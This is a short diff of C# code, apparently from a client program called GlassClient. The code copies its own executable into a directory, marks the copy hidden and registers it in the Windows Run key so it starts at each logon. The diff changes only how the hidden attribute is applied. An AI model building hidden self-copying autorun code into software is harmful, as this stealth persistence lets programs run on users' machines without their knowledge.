@@ -21,7 +21,7 @@ namespace GlassClient
             {
                 Directory.CreateDirectory(destPath);
                 File.Copy(Assembly.GetEntryAssembly().Location, filePath);
-                File.SetAttributes(filePath, FileAttributes.Hidden);
+                File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
                 RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 add.SetValue(APP_NAME, "\"" + filePath + "\"");
             }
